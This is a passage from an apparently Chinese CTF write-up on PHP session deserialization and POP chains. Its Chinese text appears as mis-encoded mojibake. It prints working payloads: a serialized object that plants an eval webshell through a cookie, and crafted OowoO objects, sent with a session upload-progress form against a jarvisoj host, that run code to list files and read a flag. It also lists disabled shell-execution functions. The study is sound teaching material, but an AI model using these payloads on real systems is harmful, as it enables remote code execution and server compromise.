å¿…é¡»ä¸º128ä½å¤§å°å†™å­—æ¯+æ•°å­—+ç‰¹æ®Šç¬¦å·ï¼Œé˜²æ­¢çˆ†ç ´</span><br>]<br>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;id&#x27;</span>])&#123;<br><span class="hljs-comment">//ç™»é™†æˆåŠŸå–æ¶ˆæ¬¡æ•°ç´¯è®¡</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]= <span class="hljs-number">0</span>;<br><span class="hljs-keyword">echo</span> json_encode(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;æ¬¢è¿æ‚¨&quot;</span>.<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;UserName0&#x27;</span>]));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-comment">//ç™»é™†å¤±è´¥ç´¯è®¡æ¬¡æ•°åŠ 1</span><br><span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>])+<span class="hljs-number">1</span>);<br><span class="hljs-keyword">echo</span> json_encode(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;ç™»é™†å¤±è´¥&quot;</span>));<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œä¸å¯èƒ½ä¼šç™»å½•æˆåŠŸï¼Œä¸‹é¢ä»£ç ä¹Ÿå¿…å®šæ‰§è¡Œ</p><p>$_COOKIE[â€˜limitâ€™] = base64_encode(base64_decode($_COOKIE[â€˜limitâ€™])+1);<br>echo json_encode(array(â€œerrorâ€,â€msgâ€=&gt;â€ç™»é™†å¤±è´¥â€));</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//inc.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>date_default_timezone_set(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);<br>session_start();<br><span class="hljs-keyword">use</span> \<span class="hljs-title">CTFSHOW</span>\<span class="hljs-title">CTFSHOW</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;CTFSHOW.php&#x27;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> CTFSHOW([<br>    <span class="hljs-string">&#x27;database_type&#x27;</span> =&gt; <span class="hljs-string">&#x27;mysql&#x27;</span>,<br>    <span class="hljs-string">&#x27;database_name&#x27;</span> =&gt; <span class="hljs-string">&#x27;web&#x27;</span>,<br>    <span class="hljs-string">&#x27;server&#x27;</span> =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>    <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-string">&#x27;charset&#x27;</span> =&gt; <span class="hljs-string">&#x27;utf8&#x27;</span>,<br>    <span class="hljs-string">&#x27;port&#x27;</span> =&gt; <span class="hljs-number">3306</span>,<br>    <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-string">&#x27;option&#x27;</span> =&gt; [<br>        PDO::ATTR_CASE =&gt; PDO::CASE_NATURAL<br>    ]<br>]);<br><span class="hljs-comment">// sqlæ³¨å…¥æ£€æŸ¥</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkForm</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$str</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\ï¼ˆ|\ï¼‰|\+|\=|\[|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\?/i&quot;</span>,<span class="hljs-variable">$str</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$status</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setStatus</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;status=<span class="hljs-variable">$s</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        file_put_contents(<span class="hljs-string">&quot;log-&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;username, <span class="hljs-string">&quot;ä½¿ç”¨&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;password.<span class="hljs-string">&quot;ç™»é™†&quot;</span>.(<span class="hljs-keyword">$this</span>-&gt;status?<span class="hljs-string">&quot;æˆåŠŸ&quot;</span>:<span class="hljs-string">&quot;å¤±è´¥&quot;</span>).<span class="hljs-string">&quot;----&quot;</span>.date_create()-&gt;format(<span class="hljs-string">&#x27;Y-m-d H:i:s&#x27;</span>));<br>    &#125;<br>&#125;<br><span class="hljs-comment">/*ç”Ÿæˆå”¯ä¸€æ ‡å¿—</span><br><span class="hljs-comment">*æ ‡å‡†çš„UUIDæ ¼å¼ä¸ºï¼šxxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">uuid</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$chars</span> = md5(uniqid(mt_rand(), <span class="hljs-literal">true</span>));<br>    <span class="hljs-variable">$uuid</span> = substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">16</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span> );<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$uuid</span> ;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„æ­¤å¤„</p><blockquote><p>ini_set(â€˜session.serialize_handlerâ€™, â€˜phpâ€™);</p></blockquote><p>å‡ºç°äº†ä¸€ä¸ªå†™æ–‡ä»¶çš„å‡½æ•°ï¼Œå›é¡¾ index.php å‘ç°<code>$this-&gt;usernameå’Œ$this-&gt;password</code>æ˜¯å¯æ§çš„ï¼Œè€Œåˆè¢«åŒ…å«åœ¨ check.php</p><blockquote><p>file_put_contents(â€œlog-â€œ.$this-&gt;username, â€œä½¿ç”¨â€.$this-&gt;password.â€ç™»é™†â€.($this-&gt;status?â€æˆåŠŸâ€:â€å¤±è´¥â€).â€â€”-â€œ.date_create()-&gt;format(â€˜Y-m-d H:i:sâ€™));</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦é€šè¿‡ cookie ä¼ è¿›å»æˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼Œçœ‹ä¸€ä¸‹</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021221915549.png"></p><p><code>MQ%3D%3D</code>â€“&gt;<code>MQ==</code>â€“&gt;<code>a</code>ï¼Œå¾ˆæ˜æ˜¾çš„ä¼ å€¼äº†ï¼Œé¦–å…ˆåœ¨ cookie ä¸­è®¾ç½® limit å€¼ä¸º payloadï¼Œç„¶ååˆ·æ–° index.phpï¼Œæ­¤æ—¶ session_start()å¼€å¯äº†ä¼šè¯ï¼Œç›²çŒœæ˜¯ php_serialize å¼•æ“å­˜å‚¨çš„å¯¹è±¡æ•°æ®ï¼Œæˆ‘ä»¬å†é€šè¿‡è®¿é—®åŒ…å«äº† inc.php çš„ check.phpï¼Œå°±æ‰§è¡Œäº†è®¾ç½® php ä¸ºå¼•æ“çš„ä»£ç ï¼Œè¿›è€Œååºåˆ—åŒ–å¾—åˆ°ä¸€ä¸ªæ–°çš„å¯¹è±¡</p><p>æ‰€ä»¥é€šè¿‡æ³¨å…¥ <code>|</code> å­—ç¬¦ä¼ªé€ äº†å¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®ï¼Œç”Ÿæˆæœ¨é©¬æ–‡ä»¶</p><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;hack.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$status</span> = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> User();<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(<span class="hljs-string">&#x27;|&#x27;</span>.serialize(<span class="hljs-variable">$c</span>));<br></code></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/6640">https://xz.aliyun.com/t/6640</a></p><p>cookie ä¸­å«æœ‰ UM_distinctid çš„ï¼Œä¸å¯ç”¨ hackbar çš„å¢åŠ å¤´åŠŸèƒ½ï¼Œä¼šè¦†ç›–æ‰åŸæœ‰çš„ cookieï¼Œè€Œæˆ‘ä»¬çš„ç›®æ ‡åªæ˜¯æ›¿æ¢ cookie[PHPSESSID]å€¼</p><h4 id="jarvisoj-web-çš„ä¸€é“-SESSION-ååºåˆ—åŒ–"><a href="#jarvisoj-web-çš„ä¸€é“-SESSION-ååºåˆ—åŒ–" class="headerlink" title="jarvisoj-web çš„ä¸€é“ SESSION ååºåˆ—åŒ–"></a>jarvisoj-web çš„ä¸€é“ SESSION ååºåˆ—åŒ–</h4><p><a href="http://web.jarvisoj.com:32784/index.php">http://web.jarvisoj.com:32784/index.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//A webshell is wait for you</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;mdzz);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> OowoO();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    highlight_string(file_get_contents(<span class="hljs-string">&#x27;index.php&#x27;</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å­˜åœ¨<code>ini_set(â€˜session.serialize_handlerâ€™, â€˜phpâ€™)</code>ï¼Œæš‚æ—¶æ²¡æ‰¾åˆ°ç”¨ php_serialize æ·»åŠ  session çš„æ–¹æ³•ï¼Œä½† get ä¼ å…¥ phpinfo æ—¶ä¼šå®ä¾‹åŒ–<code>OowoO</code>è¿™ä¸ªç±»å¹¶å¯ä»¥æŸ¥çœ‹ phpinfo</p><blockquote><p>index.php?phpinfo</p></blockquote><p>disable_function</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">dl,<span class="hljs-keyword">exec</span>,<span class="hljs-keyword">system</span>,passthru,popen,proc_open,pcntl_exec,shell_exec,<span class="hljs-keyword">chmod</span>,set_time_limit,<span class="hljs-keyword">chroot</span>,error_log,pfsockopen,syslog,<span class="hljs-keyword">symlink</span>,putenv,chgrp,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/07/12/.png"></p><p><code>session.upload_progress.enabled</code>ä¸º Onã€‚<code>session.upload_progress.enabled</code>æœ¬èº«ä½œç”¨ä¸å¤§ï¼Œæ˜¯ç”¨æ¥æ£€æµ‹ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„è¿›åº¦ã€‚ä½†å½“ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ï¼ŒåŒæ—¶ POST ä¸€ä¸ªä¸ php.ini ä¸­<code>session.upload_progress.name</code>åŒåçš„å˜é‡æ—¶ï¼ˆ<code>session.upload_progress.name</code>çš„å˜é‡å€¼é»˜è®¤ä¸º<code>PHP_SESSION_UPLOAD_PROGRESS</code>ï¼‰ï¼ŒPHP æ£€æµ‹åˆ°è¿™ç§åŒåè¯·æ±‚ä¼šåœ¨$_SESSION ä¸­æ·»åŠ ä¸€æ¡æ•°æ®ã€‚æˆ‘ä»¬ç”±æ­¤æ¥è®¾ç½® sessionã€‚</p><p>é¦–å…ˆ å…ˆæ„é€ ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span></span><br><span class="hljs-tag">  <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span></span><br><span class="hljs-tag">&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ¥ç€æååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;mdzz);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> OowoO();<br><span class="hljs-variable">$a</span>-&gt;mdzz=<span class="hljs-string">&quot;var_dump(scandir(&#x27;./&#x27;));&quot;</span>;<br><span class="hljs-comment">//$a-&gt;mdzz=&quot;var_dump(scandir(&#x27;__dir__&#x27;));&quot;;</span><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//å¾—åˆ°ï¼šO:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:24:&quot;var_dump(scandir(&#x27;./&#x27;));&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>é˜²æ­¢è½¬ä¹‰ï¼Œåœ¨å¼•å·å‰é¢åŠ ä¸Š\å¾—åˆ°<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210715000429267.png"></p><p>åœ¨ phpinfo å¾—çŸ¥æ ¹ç›®å½•ä¸º<code>DOCUMENT_ROOT:/opt/lampp/htdocs</code></p><p>ä¿®æ”¹ä¼ å¼•ç”¨ä¸º<code>print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code></p><p>åŒæ ·çš„æ–¹æ³•å¾—åˆ° payloadï¼š<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210715001047516.png"></p><h2 id="POP-é“¾"><a href="#POP-é“¾" class="headerlink" title="POP é“¾"></a>POP é“¾</h2><h3 id="POPï¼šé¢å‘å±æ€§ç¼–ç¨‹"><a href="#POPï¼šé¢å‘å±æ€§ç¼–ç¨‹" class="headerlink" title="POPï¼šé¢å‘å±æ€§ç¼–ç¨‹"></a>POPï¼šé¢å‘å±æ€§ç¼–ç¨‹</h3><p>é¢å‘å±æ€§ç¼–ç¨‹ï¼ˆProperty-Oriented Programingï¼‰ ç”¨äºä¸Šå±‚è¯­è¨€æ„é€ ç‰¹å®šè°ƒç”¨é“¾çš„æ–¹æ³•ï¼Œä¸äºŒè¿›åˆ¶åˆ©ç”¨ä¸­çš„é¢å‘è¿”å›ç¼–ç¨‹ï¼ˆReturn-Oriented Programingï¼‰çš„åŸç†ç›¸ä¼¼ï¼Œéƒ½æ˜¯ä»ç°æœ‰è¿è¡Œç¯å¢ƒä¸­å¯»æ‰¾ä¸€ç³»åˆ—çš„ä»£ç æˆ–è€…æŒ‡ä»¤è°ƒç”¨ï¼Œç„¶åæ ¹æ®éœ€æ±‚æ„æˆä¸€ç»„è¿ç»­çš„è°ƒç”¨é“¾ã€‚åœ¨æ§åˆ¶ä»£ç æˆ–è€…ç¨‹åºçš„æ‰§è¡Œæµç¨‹åå°±èƒ½å¤Ÿä½¿ç”¨è¿™ä¸€ç»„è°ƒç”¨é“¾æ¥æ‰§è¡Œä¸€äº›æ“ä½œã€‚</p><p>åœ¨äºŒè¿›åˆ¶åˆ©ç”¨æ—¶ï¼ŒROP é“¾æ„é€ ä¸­æ˜¯å¯»æ‰¾å½“å‰ç³»ç»Ÿç¯å¢ƒä¸­æˆ–è€…å†…å­˜ç¯å¢ƒé‡Œå·²ç»å­˜åœ¨çš„ã€å…·æœ‰å›ºå®šåœ°å€ä¸”å¸¦æœ‰è¿”å›æ“ä½œçš„æŒ‡ä»¤é›†ï¼Œè€Œ POP é“¾çš„æ„é€ åˆ™æ˜¯å¯»æ‰¾ç¨‹åºå½“å‰ç¯å¢ƒä¸­å·²ç»å®šä¹‰äº†æˆ–è€…èƒ½å¤ŸåŠ¨æ€åŠ è½½çš„å¯¹è±¡ä¸­çš„å±æ€§ï¼ˆå‡½æ•°æ–¹æ³•ï¼‰ï¼Œå°†ä¸€äº›å¯èƒ½çš„è°ƒç”¨ç»„åˆåœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå®Œæ•´çš„ã€å…·æœ‰ç›®çš„æ€§çš„æ“ä½œã€‚<br>äºŒè¿›åˆ¶ä¸­é€šå¸¸æ˜¯ç”±äºå†…å­˜æº¢å‡ºæ§åˆ¶äº†æŒ‡ä»¤æ‰§è¡Œæµç¨‹ï¼Œè€Œååºåˆ—åŒ–è¿‡ç¨‹å°±æ˜¯æ§åˆ¶ä»£ç æ‰§è¡Œæµç¨‹çš„æ–¹æ³•ä¹‹ä¸€ï¼Œå‰æï¼š<strong>è¿›è¡Œååºåˆ—åŒ–çš„æ•°æ®èƒ½å¤Ÿè¢«ç”¨æˆ·è¾“å…¥æ‰€æ§åˆ¶ã€‚</strong></p><h3 id="Autoloading"><a href="#Autoloading" class="headerlink" title="Autoloading"></a>Autoloading</h3><p>ä¼ ç»Ÿçš„ PHP è¦æ±‚åº”ç”¨ç¨‹åºå¯¼å…¥æ¯ä¸ªç±»ä¸­çš„æ‰€æœ‰ç±»æ–‡ä»¶ï¼Œè¿™æ ·å°±æ„å‘³ç€æ¯ä¸ª PHP æ–‡ä»¶éœ€è¦ä¸€åˆ—é•¿é•¿çš„ include æˆ– require æ–¹æ³•ï¼Œè€Œåœ¨å½“å‰ä¸»æµçš„ PHP æ¡†æ¶ä¸­ï¼Œéƒ½é‡‡ç”¨äº† Autoloading è‡ªåŠ¨åŠ è½½ç±»æ¥å®Œæˆè¿™æ ·ç¹é‡çš„å·¥ä½œã€‚åœ¨å®Œå–„ç®€åŒ–äº†ç±»ä¹‹é—´è°ƒç”¨çš„åŠŸèƒ½çš„åŒæ—¶ï¼Œä¹Ÿä¸ºåºåˆ—åŒ–æ¼æ´é€ æˆäº†ä¾¿æ·ã€‚Composer æ˜¯ PHP ç”¨æ¥ç®¡ç†ä¾èµ–ï¼ˆdependencyï¼‰å…³ç³»çš„å·¥å…·ã€‚ä½ å¯ä»¥åœ¨è‡ªå·±çš„é¡¹ç›®ä¸­å£°æ˜æ‰€ä¾èµ–çš„å¤–éƒ¨å·¥å…·åº“ï¼ˆlibrariesï¼‰ï¼ŒComposer ä¼šå¸®ä½ å®‰è£…è¿™äº›ä¾èµ–çš„åº“æ–‡ä»¶ã€‚Composer é»˜è®¤æ˜¯ä» Packagist æ¥ä¸‹è½½ä¾èµ–åº“çš„ã€‚<br>æ‰€ä»¥æˆ‘ä»¬æŒ–æ˜æ¼æ´çš„æ€è·¯å°±å¯ä»¥ä»ä¾èµ–åº“æ–‡ä»¶å…¥æ‰‹ã€‚</p><p>1.ä»å¯èƒ½å­˜åœ¨æ¼æ´çš„ä¾èµ–åº“æ–‡ä»¶å…¥æ‰‹ å¯ä»¥ä½¿ç”¨ä»£ç å®¡è®¡å·¥å…·æˆ–è€…å…¨å±€æ‰‹åŠ¨æœç´¢__wakeup()å’Œ__destruct()</p><p>åœ¨ composer.json ä¸­å­˜åœ¨ä»¥ä¸‹ç»„ä»¶å°±è¦å¼•èµ·æ³¨æ„äº†</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs isbl">ä»»æ„å†™<br><span class="hljs-variable">monolog</span>/<span class="hljs-function"><span class="hljs-title">monolog</span>(&lt;<span class="hljs-number">1.11</span>.<span class="hljs-number">0</span>)</span><br><span class="hljs-variable">guzzlehttp</span>/<span class="hljs-variable">guzzle</span><br><span class="hljs-variable">guzzle</span>/<span class="hljs-variable">guzzle</span><br>ä»»æ„åˆ é™¤<br><span class="hljs-variable">swiftmailer</span>/<span class="hljs-variable">swiftmailer</span><br></code></pre></td></tr></table></figure><p>2.ä»åº”ç”¨çš„ä»£ç æ¡†æ¶çš„é€»è¾‘ä¸Šå…¥æ‰‹</p><p>3.ä» PHP è¯­è¨€æœ¬èº«æ¼æ´å…¥æ‰‹</p><h3 id="POP-é“¾åˆ©ç”¨"><a href="#POP-é“¾åˆ©ç”¨" class="headerlink" title="POP é“¾åˆ©ç”¨"></a>POP 